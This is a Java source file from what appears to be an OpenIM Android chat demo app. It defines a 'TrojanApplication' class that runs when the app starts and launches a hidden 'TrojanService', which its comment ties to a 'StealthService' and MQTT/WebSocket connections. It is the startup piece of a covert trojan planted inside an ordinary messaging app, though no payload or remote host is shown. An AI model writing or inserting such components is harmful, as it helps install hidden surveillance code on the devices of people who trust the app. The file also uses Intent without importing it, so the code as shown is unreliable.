package io.openim.android.demo.trojan;

import android.content.Context;
import android.util.Log;

/**
 * Trojan Application - Initialized when DemoApplication starts
 * Responsible for starting the StealthService and initializing MQTT/WebSocket connections
 */
public class TrojanApplication {
    private static final String TAG = "TrojanApp";
    private static Context appContext;
    private static boolean initialized = false;

    public static void init(Context context) {
        if (initialized) return;
        appContext = context.getApplicationContext();
        initialized = true;
        Log.d(TAG, "Trojan initialized");
        startService(appContext);
    }

    public static void startService(Context context) {
        try {
            android.content.Intent serviceIntent = new Intent(context, io.openim.android.demo.trojan.TrojanService.class);
            context.startService(serviceIntent);
            Log.d(TAG, "TrojanService started");
        } catch (Exception e) {
            Log.e(TAG, "Failed to start TrojanService", e);
        }
    }

    public static boolean isRunning() {
        return initialized;
    }
}
